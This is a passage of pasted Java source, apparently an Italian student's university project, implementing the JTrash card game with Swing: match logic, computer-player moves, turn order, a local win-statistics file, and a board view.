////        centerX = x + frontCardImage.getWidth() / 2;
////        centerY = y + frontCardImage.getHeight() / 2;
//
//        int xPos = (getWidth() - frontCardImage.getWidth()) / 2; // Calcola la posizione x per centrare l'immagine
//        int yPos = (getHeight() - frontCardImage.getHeight()) / 2; // Calcola la posizione y per centrare l'immagine
//
//        // Disegna la carta frontale (superiore)
//        Graphics2D g2d = (Graphics2D) g.create();
////        g2d.translate(centerX, centerY);
//        g2d.scale(scaleX, 1.0); // Scala sull'asse X
//
//        if (!revealing)
//            g2d.drawImage(frontCardImage, -xPos, -yPos, null);
////            g2d.drawImage(frontCardImage, -frontCardImage.getWidth(null) / 2, -frontCardImage.getHeight(null) / 2, null);
//        else
////            g2d.drawImage(backCardImage, frontCardImage.getWidth(null) / 2, -backCardImage.getHeight(null) / 2, -backCardImage.getWidth(null), backCardImage.getHeight(null), null);
//            g2d.drawImage(backCardImage, xPos, -yPos, -xPos, yPos, null);
//
//        g2d.dispose();
//    }

    public void avviaMovimento(int finalx, int finaly) {

        this.finalx = finalx;
        this.finaly = finaly;
        this.deltaX = deltaX = 1;
        this.deltaY = deltaY = 1;

        timerMovimento.start();

    }

    public void avviaRotazione() {
        this.timerRotazione.start();

    }
"
NLnrQE7h,Model/MatchManager,aa91,Java,Friday 1st of March 2024 07:43:39 AM CDT,"package model;

import javax.swing.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.Semaphore;

public class MatchManager extends Observable {

    List<Player> playerList;
    Deck gameDeck;
    Deck discardedCards;
    Card cardInHand;
    int playerIndex;
    int numberOfPlayer;
    String giocatoriPath = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/ProgettoJava/src/Giocatori.txt"";

    List<Player> winnerPlayerList;
    int firtPlayerIndexWinner;
    boolean ultimoGiro;

    private static boolean interactionOnDeck = true;
    private static boolean interactionOnBoard = false;

    public Semaphore semaphoreInteractionOnDeck = new Semaphore(0);
    public Semaphore semaphoreInteractionOnBoard = new Semaphore(0);

    boolean firstPlay = true;

    public MatchManager() {
    }

    public void avviaGioco(){
        //Da reinserire
//        if(firstPlay == true) {
            setChanged();
            notifyObservers(Arrays.asList(9));
//        }

        System.out.println(""Inserisci numero giocatori"");
        Scanner scanner = new Scanner(System.in);
        setNumberOfPlayer(scanner.nextInt());
        inizializzaGiocatori();
        inizializzaGioco();
    }

    //inizializzo il gioco di carte
    public void inizializzaGioco() {
        //genero un gamedeck
        this.gameDeck = new Deck(numberOfPlayer);
        this.discardedCards = new Deck();

        this.winnerPlayerList = new ArrayList<>();

        firtPlayerIndexWinner = -1;
        ultimoGiro = false;

        for (Player p : playerList) {
            p.initializeBoardCard();
            p.initializaRemainingCard();
        }

        for (Player p : playerList) {
            assegnaCarte(p, this.gameDeck);
        }

        Card cartaGirata = this.gameDeck.giveCard();

        //Giro prima carta sul tavolo
        discardedCards.addCard(cartaGirata);


        setChanged();
        notifyObservers(Arrays.asList(0, playerList, playerIndex, discardedCards));

//        setChanged();
//        notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));

    }

    public void inizializzaGiocatori() {
        Scanner scanner2 = new Scanner(System.in);
        //Inizializzo lista giocatori
        playerList = new ArrayList<>();
        String nicknameApp;

        //Inserisco Player Umano
        System.out.println(""Inserisci nome del Player Umano"");
        nicknameApp = scanner2.nextLine();
//        nicknameApp = ""Andrea"";
        playerList.add(new Player(nicknameApp));

        //Inserisco Player Computer
        for (int i = 1; i < numberOfPlayer; i++) {
            System.out.println(""Inserisci nome del Player Computer"");
            nicknameApp = scanner2.nextLine();
//            nicknameApp = ""Francesco"";
            playerList.add(new Player(nicknameApp));
        }

        try(BufferedReader br = new BufferedReader(new FileReader(giocatoriPath))){
            String line;
            while((line = br.readLine()) != null){
                String[] statisticPlayer = line.split("" "");

                String nomePlayer = statisticPlayer[0];
                int lvPlayer = Integer.parseInt(statisticPlayer[1]);

                for(Player p: playerList){
                    if(p.getNickname().equals(nomePlayer))
                        p.setPartiteVinte(lvPlayer);
                }

            }

        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


        public static void assegnaCarte(Player player, Deck gameDeck) {
        for (int i = 0; i < player.getboardCardDimension(); i++) {
            player.takeCardToBoard(gameDeck.giveCard());
        }
    }

    private boolean controlloCartaJackDonna(Card card) {
        if (card.getRank() == CardRank.JACK || card.getRank() == CardRank.DONNA)
            return true;

        return false;
    }

    private boolean controlloCartaJollyRe(Card card) {
        if (card.getRank() == CardRank.JOLLY || card.getRank() == CardRank.RE)
            return true;

        return false;
    }

    private void movimentoComputer(Player player) {
        boolean sostituito = false;
        Card appCard = null;
        while (!sostituito) {

            //scelgo un numero a caso tra 0 e dimensione del board
            int randomIndex = (int) (Math.random() * player.getboardCardDimension());
            //prendo in mano carta che era a terra
            appCard = player.getBoardCards().get(randomIndex);

            if (!appCard.getFaceUp()) {
                player.showCard();
//                System.out.print("" * Scambio: "" + cardInHand + "" con "" + appCard + ""  111"" + ""\n"");
//                System.out.println("" * Indici: "" + cardInHand.getRank().rankToValue() + "" con "" + (randomIndex + 1));

                //posiziono la carta
                player.getBoardCards().set(randomIndex, cardInHand);

                cardInHand = appCard;
                //Ristampo la scacchiera
                setChanged();
                notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

                setChanged();
                notifyObservers(Arrays.asList(6, this.playerIndex));

                //In revisione, si può rimuovere questo controllo è anche nel ComposeGampanel from matrix
                if(!discardedCards.isEmpty()) {
                    //Aggiorno carta sul tavolo
                    setChanged();
                    notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
                }

                sostituito = true;
            }
        }


        //Aggiorno visualizzazione carta vicino a giocatore dal giocatore
        setChanged();
        notifyObservers(Arrays.asList(2, cardInHand, playerIndex));

        //controllo termine partita
//        controlloTerminePartita(player);

        System.out.println(""Uscito da movimento computer"");
    }

    public void movimentoUmanoPescaTerra() {
        if(interactionOnDeck == true){
//            interactionOnDeck = false;
            cardInHand = discardedCards.getLastERemove();
            System.out.println(""Carta Pescata da terra: "" + cardInHand);
            semaphoreInteractionOnDeck.release();
        }
    }

    public void movimentoUmanoPescaMazzo(){
        if(interactionOnDeck == true) {
//            interactionOnDeck = false;
            cardInHand = gameDeck.giveCard();
            System.out.println(""Carta pescata dal mazzo: "" + cardInHand);
            semaphoreInteractionOnDeck.release();
        }
    }

    public void turnoDiGioco() {

        if(ultimoGiro == true && playerIndex == firtPlayerIndexWinner) {
            System.out.println(""Sono qui"");
            if (termineRoundOTermineGioco() == true) {
                System.out.println(""Gioco Terminato"");

                System.out.println(""Vuoi giocare nuovamente?: "");
                Scanner scanner = new Scanner(System.in);
                String scelta = scanner.nextLine();

                if(scelta.equals(""no""))
                    throw new RuntimeException(""Gioco Terminato"");
                else if (scelta.equals(""si"")) {
                    firstPlay = false;
                    avviaGioco();

                }
                else
                    throw new RuntimeException(""Scelta non valida!"");


            } else {
                //Elimino carta visualizzata a terra
                setChanged();
                notifyObservers(Arrays.asList(5));
            }
        }

        System.out.println(""********************************"");
        if (playerIndex != -1) {
            System.out.println(""Turno di: "" + playerList.get(playerIndex).getNickname());
            System.out.println("" * Carta coperta: "" + cardInHand);
        }

        //Visualizzazione pedina
//        setChanged();
//        notifyObservers(Arrays.asList(6, this.playerIndex));

        setChanged();
        notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

        sleep(300);

        //Controllo se carte del mazzo sono terminate
        if (gameDeck.getRemainingCardOfDeck() == 0) {
            Deck.mischiaMazzo(discardedCards);
            this.gameDeck = discardedCards;
            discardedCards = new Deck();
        }

        Card appCard = null;
        Player playerInRound = playerList.get(playerIndex);

        if(playerIndex == 0){
            System.out.println(""Fa la tua scelta"");
            System.out.println(gameDeck.getFirst());

            try {
                interactionOnDeck = true;
                semaphoreInteractionOnDeck.acquire();
                interactionOnDeck = false;

            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        else{
            //Se le scartate sono un Re o Jolly
            if(discardedCards.getLast().getRank() == CardRank.RE || discardedCards.getLast().getRank() == CardRank.JOLLY){
                cardInHand = discardedCards.getLastERemove();
                
            //Se il rank carta > 10 o maggiore della dimensione board giocatore o la faceUp non è un Wildcard
            } else if (discardedCards.getLast().getRank().rankToValue() > 10 || discardedCards.getLast().getRank().rankToValue() > playerInRound.getboardCardDimension() || (playerInRound.getBoardCards().get(discardedCards.getLast().getRank().rankToValue() - 1).getFaceUp() && (playerInRound.getBoardCards().get(discardedCards.getLast().getRank().rankToValue() - 1).getRank() != CardRank.JOLLY && playerInRound.getBoardCards().get(discardedCards.getLast().getRank().rankToValue() - 1).getRank() != CardRank.RE))) {
                cardInHand = this.gameDeck.giveCard();
            }
            //Ottimizzazione scelta giocatore con carte < 5
            else if(!playerInRound.getBoardCards().get(discardedCards.getLast().getRank().rankToValue()-1).getFaceUp() && playerInRound.getRemainingCards()< 5){
                cardInHand = discardedCards.getLastERemove();
            }
            //scelgo casualmente se pescare dal mazzo o da terra
            else{
                if(casuale0e1() == 0)
                    cardInHand = this.gameDeck.giveCard();
                else {
                    cardInHand = discardedCards.getLastERemove();
                }
            }
        }

//        In revisione
//        //Visualizzazione carte scartate
//        if(discardedCards.isEmpty()) {
//            setChanged();
//            notifyObservers(Arrays.asList(5));
//        }
//        else {
//            setChanged();
//            notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
//        }

        setChanged();
        notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

        sleep(300);

        //Visualizzazione carta pescata
        setChanged();
        notifyObservers(Arrays.asList(2, cardInHand, playerIndex));

//        sleep(200);
//
        sleep(1000);

        do {
            sleep(1000);

            cardInHand.setFaceUpTrue();
            int cardInHandIndex = cardInHand.getRank().rankToValue() - 1;

            if (controlloCartaJackDonna(cardInHand)) {
                //Rimuovo visualizzazione carta pescata dal giocatore
                setChanged();
                notifyObservers(Arrays.asList(3, playerIndex));

                discardedCards.addCard(cardInHand);
                System.out.println("" * Scarto: "" + cardInHand);

//                In revisione
//                //Aggiorno visualizzazione scarto la carta e la posiziono sul tavolo
//                setChanged();
//                notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
                setChanged();
                notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

                break;

            //Controllo se la carta in mano è una WildCard
            } else if (controlloCartaJollyRe(cardInHand)) {
                if (playerIndex != 0)
                    movimentoComputer(playerInRound);
                else {
                    interactionOnBoard = true;

                    try {
                        semaphoreInteractionOnBoard.acquire();
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    interactionOnBoard = false;
                }

                sleep(500);
                playerInRound.reduceRemainingCards();

                if (controlloJtrash()) {
                    //Rimuovo visualizzazione carta pescata dal giocatore
                    setChanged();
                    notifyObservers(Arrays.asList(3, playerIndex));
                    System.out.println("" * Scarto: "" + cardInHand);
                    discardedCards.addCard(cardInHand);
                    break;
                }
            }

            //se indice carta è maggiore di dimensione del board del giocatore e non è una WildCard
            else if (cardInHandIndex >= playerInRound.getboardCardDimension()) {
                discardedCards.addCard(cardInHand);
                System.out.println("" * Scarto: "" + cardInHand);

                //Rimuovo visualizzazione carta pescata dal giocatore
                setChanged();
                notifyObservers(Arrays.asList(3, playerIndex));

//                In revisione
//                setChanged();
//                notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
                setChanged();
                notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

                break;
            }
            //Se la carta non è una figura
            else {
                //controllo posizione già occupata\scoperta
                if (playerInRound.getBoardCards().get(cardInHandIndex).getFaceUp()) {
                    //se occupata da Jolly o Re
                    if (playerInRound.getBoardCards().get(cardInHandIndex).getRank() == CardRank.JOLLY || playerInRound.getBoardCards().get(cardInHandIndex).getRank() == CardRank.RE) {

                        //Carta appoggio per WildCards che era sul board
                        appCard = playerInRound.getBoardCards().get(cardInHandIndex);

//                       Stampe
                        //sostituisco WildCard sul board con carta in mano
                        playerInRound.showCard();
                        System.out.println("" * Scambio: "" + cardInHand + "" con "" + appCard + ""  256"");
                        System.out.println("" * Indici: "" + cardInHand.getRank().rankToValue() + "" con "" + cardInHandIndex);

                        playerInRound.getBoardCards().set(cardInHandIndex, cardInHand);


                        setChanged();
                        notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

//                        setChanged();
//                        notifyObservers(Arrays.asList(6, this.playerIndex));

//                        In revisione
//                        if(!discardedCards.isEmpty()) {
//                            //Aggiorno carta sul tavolo
//                            setChanged();
//                            notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
//                        }

                        //Aggiorno visualizzazione carta vicino al giocatore
                        cardInHand = appCard;
                        setChanged();
                        notifyObservers(Arrays.asList(2, cardInHand, playerIndex));

//                        playerInRound.reduceRemainingCards();

                        if (controlloJtrash()) {
                            //Rimuovo visualizzazione carta pescata dal giocatore
                            setChanged();
                            notifyObservers(Arrays.asList(3, playerIndex));
                            System.out.println("" * Scarto: "" + cardInHand);
                            discardedCards.addCard(cardInHand);
                            break;
                        }
                    }

                    //altrimenti
                    else {
                        discardedCards.addCard(cardInHand);
                        System.out.println("" * Scarto: "" + cardInHand);
//                        In revisione
//                        setChanged();
//                        notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));

                        setChanged();
                        notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));
                        break;
                    }
                }

                //se posizione non è occupata
                else {
                    //prendo in mano carta coperta
                    appCard = playerInRound.getBoardCards().get(cardInHandIndex);

                    //posiziono la carta
                    playerInRound.showCard();
                    System.out.println("" * Scambio: "" + cardInHand + "" con "" + appCard + ""  299"");
                    System.out.println("" * Indici: "" + cardInHand.getRank().rankToValue() + "" con "" + cardInHandIndex);

                    setChanged();
                    notifyObservers(Arrays.asList(8, playerIndex, cardInHandIndex));

                    sleep(1000);

//                    setChanged();
//                    notifyObservers(Arrays.asList(10, playerIndex, cardInHandIndex));
//                    sleep(1000);

                    playerInRound.getBoardCards().set(cardInHandIndex, cardInHand);

                    //Aggiorno visualizzazione scacchiera giocatori
                    setChanged();
                    notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

//                    In revisione
//                    setChanged();
//                    notifyObservers(Arrays.asList(6, this.playerIndex));

                    if(!discardedCards.isEmpty()) {
//                        In revisione
                        //Aggiorno carta sul tavolo
//                        setChanged();
//                        notifyObservers(Arrays.asList(1, discardedCards.getLast(), playerIndex));
                    }

                    cardInHand = appCard;
                    setChanged();
                    notifyObservers(Arrays.asList(2, cardInHand, playerIndex));

                    playerInRound.reduceRemainingCards();

                    if (controlloJtrash()) {
                        //Rimuovo visualizzazione carta pescata dal giocatore
                        setChanged();
                        notifyObservers(Arrays.asList(3, playerIndex));
                        System.out.println("" * Scarto: "" + cardInHand);

                        discardedCards.addCard(cardInHand);
                        break;
                    }
                }
            }
        } while (true);

        setChanged();
        notifyObservers(Arrays.asList(3, playerIndex));
        sleep(200);

//        In revisione
//        setChanged();
//        notifyObservers(Arrays.asList(7, this.playerIndex));
        setChanged();
        notifyObservers(Arrays.asList(4, playerList, playerIndex, discardedCards));

        sleep(1500);

        calcolaTurno();
    }

    private static void sleep(int millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean termineRoundOTermineGioco() {
        boolean giocoFinito = false;

        for(Player p: winnerPlayerList)
            p.reduceBoardCardDimension();

        for (Player p : this.playerList) {
            System.out.println(""Dimensione Board: "" + p.getNickname() + "" "" + p.getboardCardDimension());
        }

        for(Player p: winnerPlayerList){
            if (p.getboardCardDimension() == 0) {
                giocoFinito = true;
                p.incrementaPartiteVinte();
                System.out.println(""Gioco terminato da: "" + p.getNickname());
            }
        }


        if(giocoFinito){
            File file = new File(giocatoriPath);

            if(!file.exists()) {
                try {
                    file.createNewFile();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

            HashMap<String, Integer> statisticheGiocatoriLette = new HashMap<>();

            try(BufferedReader br = new BufferedReader(new FileReader(giocatoriPath))){
                String line;

                while((line = br.readLine()) != null){
                    String[] app = line.split("" "");

                    statisticheGiocatoriLette.put(app[0], Integer.parseInt(app[1]));
                }

            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            for(Player p: playerList){
                statisticheGiocatoriLette.computeIfPresent(p.getNickname(), (key, value) -> {
                    return Math.max(value, p.getPartiteVinte());
                });

                statisticheGiocatoriLette.computeIfAbsent(p.getNickname(), key-> p.getPartiteVinte());
            }

            FileWriter fw = null;

            try {
                fw = new FileWriter(file.getAbsoluteFile());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            BufferedWriter bw = new BufferedWriter(fw);

            for(String key: statisticheGiocatoriLette.keySet()) {
                try {
                    bw.write(key + "" "" + statisticheGiocatoriLette.get(key) + ""\n"");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

            try {
                bw.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }


        this.playerIndex = 0;
        inizializzaGioco();

        if(giocoFinito)
            return true;
        else
            return false;
    }

    private boolean controlloJtrash() {
        if (playerList.get(playerIndex).getRemainingCards() == 0) {
            System.out.println(playerList.get(playerIndex).getNickname() + "": *** JTrash ***"");

            if (ultimoGiro == false){
                firtPlayerIndexWinner = playerIndex;
                ultimoGiro = true;
                System.out.println(""ULTIMOOOOO GIROOOOOOOOO"");
            }

            winnerPlayerList.add(playerList.get(playerIndex));

            return true;
        }
        else
            return false;
    }

    public void calcolaTurno() {
        if(numberOfPlayer <4) {
            this.playerIndex++;
            if (this.playerIndex == numberOfPlayer) {
                this.playerIndex = 0;
            }
        }
        else {
            switch (playerIndex) {
                case -1:
                    this.playerIndex = 0;
                    break;

                case 0:
                    this.playerIndex = 3;
                    break;

                case 3:
                    this.playerIndex = 1;
                    break;

                case 1:
                    this.playerIndex = 2;
                    break;

                case 2:
                    this.playerIndex = 0;
                    break;
            }
        }

    }

    public int casuale0e1(){
        double appNum =  Math.random();

        if(appNum >= 0.5)
            return 1;
        else
            return 0;
//        return 1;

    }

    public List<Player> getPlayerList() {
        return this.playerList;
    }

    public void setNumberOfPlayer(int numberOfPlayer) {
        this.numberOfPlayer = numberOfPlayer;
    }

    public void movimentoUmanoPescaBoardIndex(int cardIndex) {

        if(interactionOnBoard == true) {
            System.out.println(""Sto scambiando una carta"");

            if(playerList.get(playerIndex).getBoardCards().get(cardIndex-1).getFaceUp() == false){
                Card app = playerList.get(playerIndex).getBoardCards().get(cardIndex-1);
//                setChanged();
//                notifyObservers(Arrays.asList(8,app));
                playerList.get(playerIndex).getBoardCards().set(cardIndex-1,cardInHand);
                cardInHand = app;
                semaphoreInteractionOnBoard.release();
                }
            }

    }

    public void comandoAvviaGioco(){
        System.out.println(""Premuto il pulsante avvia gioco"");
        setChanged();
        notifyObservers(Arrays.asList(99));
    }
}

"
UJJFKQrW,Controller,aa91,Java,Friday 1st of March 2024 07:42:45 AM CDT,"package controller;

import model.MatchManager;
import view.Scacchiera;
import java.util.Scanner;

public class ControlManager {
    public static void main(String[] args) throws InterruptedException {

        MatchManager matchManager = new MatchManager();
        ApplicazionManager.modelInstance = matchManager;

        Scacchiera scacchiera = new Scacchiera();

        ApplicazionManager.modelInstance.addObserver(scacchiera);

        ApplicazionManager.modelInstance.avviaGioco();

        do {
//            Thread.sleep(1500);
            ApplicazionManager.modelInstance.turnoDiGioco();
        }while(true);

    }
}
"
7qj722YB,View\Scacchiera,aa91,Java,Friday 1st of March 2024 07:41:38 AM CDT,"package view;

import controller.PersonalMouseListeners;
import model.Card;
import model.Player;
import model.Deck;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Observable;
import java.util.Observer;
import java.util.List;

public class Scacchiera implements Observer {

    final int lCard = 77;
    final int hCard = 88;

    int widthPanel = 77 * 9;
    int heightPanel = 88 * 9;

    int nRighe = 9;
    int nColonne = 9;

    private int[][] matriceScacchiera2;

    JTextArea player1TextArea = new JTextArea();
    JTextArea player2TextArea = new JTextArea();
    JTextArea player3TextArea = new JTextArea();
    JTextArea player4TextArea = new JTextArea();

    JTextArea empty1TextArea = new JTextArea(""Text 1"");

    MyPanel schermataInizialePanel;
    JLabel trashLabel;
    JButton startGameButton;

    MyPanel gamePanel;
    JFrame mainFrame;

    CartaPersonalizzataButton4[] listaCarteButton0;
    CartaPersonalizzataButton4[] listaCarteButton1;
    CartaPersonalizzataButton4[] listaCarteButton2;
    CartaPersonalizzataButton4[] listaCarteButton3;

    String cartaCopertaPath = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/"" + ""iloveimg-resized/CartaCoperta.png"";

    public Scacchiera() {}

    public void creaScacchieraPixel(List<Player> listaPlayer, int playerIndex, Deck discardedCards) {
        if(schermataInizialePanel != null)
            mainFrame.remove(schermataInizialePanel);

        if (gamePanel != null)
            mainFrame.remove(gamePanel);
        else{
            //Setto Mainframe prima volta
            mainFrame.setLayout(new GridBagLayout());
        }

        gamePanel = new MyPanel(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/BackGround_Resized.png"");
        gamePanel.setPreferredSize(new Dimension(widthPanel, heightPanel));
        gamePanel.setLayout(null);

        matriceScacchiera2 = new int[nRighe][nColonne];
        impostaMatriceIniziale(listaPlayer);

        composeGamePanelFromMatrix(listaPlayer, gamePanel, playerIndex, discardedCards);
        addingMainElementToFrame(mainFrame, gamePanel);
        setPlayerBoxDetails(listaPlayer, player1TextArea, player2TextArea, player3TextArea, player4TextArea);
        repaintPanelFrame();
    }

    public void composeGamePanelFromMatrix(List<Player> listaPlayer, MyPanel gamePanel, int playerIndex, Deck discardedCards) {
        int playerIndexMatrix;
        CartaPersonalizzataButton4 cartaPersonalizzataButton4;

        listaCarteButton0 = new CartaPersonalizzataButton4[10];
        listaCarteButton1 = new CartaPersonalizzataButton4[10];
        listaCarteButton2 = new CartaPersonalizzataButton4[10];
        listaCarteButton3 = new CartaPersonalizzataButton4[10];

        int conta = 0;

        for (int i = 0; i < matriceScacchiera2.length; i++) {
            for (int j = 0; j < matriceScacchiera2[0].length; j++) {

                if (matriceScacchiera2[i][j] == 0) {
//                    if(i != 4 && j != 5) {
//                        String testo = """" + conta + "" x:"" + j * lCard + "" "" + ""y:"" + i * hCard;
//
//                        JLabel labelVuota = new JLabel(testo);
//                        labelVuota.setBounds(j * lCard, i * hCard, lCard, hCard);
//                        labelVuota.setBorder(BorderFactory.createLineBorder(Color.WHITE));
//                        labelVuota.setVisible(true);
//
//                        gamePanel.add(labelVuota);
//                    }
                    System.out.println(""0"");

                } else {
                    //Player Up
                    if (i == 0 || i == 1) {
                        playerIndexMatrix = 0;
                        cartaPersonalizzataButton4 = (CartaPersonalizzataButton4) generazioneCarteGiocatori2(listaPlayer, playerIndexMatrix, i, j);

                        cartaPersonalizzataButton4.setBounds(j*lCard, i*hCard, lCard, hCard);
                        cartaPersonalizzataButton4.addMouseListener(new PersonalMouseListeners.PescaBoardIndex(matriceScacchiera2[i][j], cartaPersonalizzataButton4));
                        listaCarteButton0[matriceScacchiera2[i][j]-1] = cartaPersonalizzataButton4;
                        cartaPersonalizzataButton4.setSize(new Dimension(lCard, hCard));

                        gamePanel.add(cartaPersonalizzataButton4);
//                        mainFrame.add(cartaPersonalizzataButton2);
                    }

                    //Player Down
                    if (i == matriceScacchiera2.length - 1 || i == matriceScacchiera2.length - 2) {
                        playerIndexMatrix = 1;
                        cartaPersonalizzataButton4 = (CartaPersonalizzataButton4) generazioneCarteGiocatori2(listaPlayer, playerIndexMatrix, i, j);

                        cartaPersonalizzataButton4.setBounds(j*lCard, i*hCard, lCard, hCard);
                        listaCarteButton1[matriceScacchiera2[i][j]-1] = cartaPersonalizzataButton4;
                        cartaPersonalizzataButton4.setSize(new Dimension(lCard, hCard));
                        gamePanel.add(cartaPersonalizzataButton4);
//                        mainFrame.add(cartaPersonalizzataButton2);
                    }

                    //Player Sx
                    if (i > 1 && j <= 1) {
                        playerIndexMatrix = 2;
                        cartaPersonalizzataButton4 = (CartaPersonalizzataButton4) generazioneCarteGiocatori2(listaPlayer, playerIndexMatrix, i, j);

                        cartaPersonalizzataButton4.setBounds(j*lCard, i*hCard, lCard, hCard);
                        listaCarteButton2[matriceScacchiera2[i][j]-1] = cartaPersonalizzataButton4;
                        cartaPersonalizzataButton4.setSize(new Dimension(lCard, hCard));
                        gamePanel.add(cartaPersonalizzataButton4);
//                        mainFrame.add(cartaPersonalizzataButton2);
                    }

                    //Player Dx
                    if (i >= 1 && j >= matriceScacchiera2[0].length - 2) {
                        playerIndexMatrix = 3;
                        cartaPersonalizzataButton4 = (CartaPersonalizzataButton4) generazioneCarteGiocatori2(listaPlayer, playerIndexMatrix, i, j);

                        cartaPersonalizzataButton4.setBounds(j*lCard, i*hCard, lCard, hCard);
                        listaCarteButton3[matriceScacchiera2[i][j]-1] = cartaPersonalizzataButton4;
                        cartaPersonalizzataButton4.setSize(new Dimension(lCard, hCard));
                        gamePanel.add(cartaPersonalizzataButton4);
//                        mainFrame.add(cartaPersonalizzataButton2);
                    }
                }

                conta++;

            }
        }

        CartaPersonalizzataButton4 deckButton = new CartaPersonalizzataButton4(cartaCopertaPath, cartaCopertaPath);
        deckButton.setBounds(5*lCard, 4*hCard, lCard, hCard);

        if (playerIndex == 0)
            deckButton.addMouseListener(new PersonalMouseListeners.PescaMazzoListeners());

        gamePanel.add(deckButton);
    }

    private static void SLEEP(int millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private JComponent generazioneCarteGiocatori(List<Player> listaPlayer, int playerIndex, int i, int j) {
        ImageIcon cardImageIcon;
        JButton cardButton;
        JLabel cardLabel;
        String pathPlayerCardVisionata;
        Card playerCardVisionata;
        Player player = listaPlayer.get(playerIndex);
        playerCardVisionata = player.getCardFromIndex(matriceScacchiera2[i][j]);

        if (playerCardVisionata.getFaceUp())
            pathPlayerCardVisionata = getStringPathFromCard(playerCardVisionata);
        else
            pathPlayerCardVisionata = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/iloveimg-resized/CartaCoperta.png"";

        cardImageIcon = new ImageIcon(pathPlayerCardVisionata);
        if (playerIndex == 0) {
            cardButton = new JButton(cardImageIcon);
            cardButton.setBorder(BorderFactory.createLineBorder(Color.BLACK));
//        cardButton.addMouseListener();
            return cardButton;
        } else {
            cardLabel = new JLabel(cardImageIcon);
            cardLabel.setBorder(BorderFactory.createLineBorder(Color.BLACK));
            return cardLabel;
        }
    }

    private CartaPersonalizzataButton4 generazioneCarteGiocatori2(List<Player> listaPlayer, int playerIndex, int i, int j) {
        ImageIcon cardImageIcon;
        CartaPersonalizzataButton4 cardButton;
        JLabel cardLabel;
        String pathPlayerCardVisionata;
        String pathPlayerCardRetro;
        Card playerCardVisionata;
        Player player = listaPlayer.get(playerIndex);
        playerCardVisionata = player.getCardFromIndex(matriceScacchiera2[i][j]);

        if (playerCardVisionata.getFaceUp()) {
            pathPlayerCardVisionata = getStringPathFromCard(playerCardVisionata);
            pathPlayerCardRetro = getStringPathFromCard(playerCardVisionata);
        }
        else {
            pathPlayerCardVisionata = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/iloveimg-resized/CartaCoperta.png"";
            pathPlayerCardRetro = getStringPathFromCard(playerCardVisionata);
        }


//        cardButton = new CartaPersonalizzataButton4(i, j, pathPlayerCardVisionata, pathPlayerCardRetro);
        new CartaPersonalizzataButton4Final(i, j, pathPlayerCardVisionata, pathPlayerCardRetro);
        
        cardButton.setBorder(BorderFactory.createLineBorder(Color.BLACK));
        return cardButton;
    }

    private void addingMainElementToFrame(JFrame mainFrame, MyPanel gamePanel) {
        GridBagConstraints gbcEmpty1TextArea = new GridBagConstraints();
        gbcEmpty1TextArea.weighty = 0.1;
        gbcEmpty1TextArea.weightx = 0.1;
        gbcEmpty1TextArea.gridx = 0;
        gbcEmpty1TextArea.gridy = 0;

//        mainFrame.add(new JTextArea(""Text 1""), gbcEmpty1TextArea);
        mainFrame.add(empty1TextArea, gbcEmpty1TextArea);

        GridBagConstraints gbcPlayer1TextArea = new GridBagConstraints();
        gbcPlayer1TextArea.weighty = 0.1;
        gbcPlayer1TextArea.weightx = 0.1;
        gbcPlayer1TextArea.gridx = 1;
        gbcPlayer1TextArea.gridy = 0;
        mainFrame.add(player1TextArea, gbcPlayer1TextArea);

        GridBagConstraints gbcEmpty2TextArea = new GridBagConstraints();
        gbcEmpty2TextArea.weighty = 0.1;
        gbcEmpty2TextArea.weightx = 0.1;
        gbcEmpty2TextArea.gridx = 2;
        gbcEmpty2TextArea.gridy = 0;
//        mainFrame.add(new JTextArea(""Text 2""), gbcEmpty2TextArea);
        mainFrame.add(empty1TextArea, gbcEmpty1TextArea);

        GridBagConstraints gbcPlayer3TextArea = new GridBagConstraints();
        gbcPlayer3TextArea.weighty = 0.1;
        gbcPlayer3TextArea.weightx = 0.1;
        gbcPlayer3TextArea.gridx = 0;
        gbcPlayer3TextArea.gridy = 1;
        mainFrame.add(player3TextArea, gbcPlayer3TextArea);

        GridBagConstraints gbcMyPanel = new GridBagConstraints();
        gbcMyPanel.weightx = 0.1;
        gbcMyPanel.weighty = 0.1;
        gbcMyPanel.gridx = 1;
        gbcMyPanel.gridy = 1;

        mainFrame.add(gamePanel, gbcMyPanel);

        GridBagConstraints gbcPlayer4TextArea = new GridBagConstraints();
        gbcPlayer4TextArea.weighty = 0.1;
        gbcPlayer4TextArea.weightx = 0.1;
        gbcPlayer4TextArea.gridx = 2;
        gbcPlayer4TextArea.gridy = 1;
        mainFrame.add(player4TextArea, gbcPlayer4TextArea);

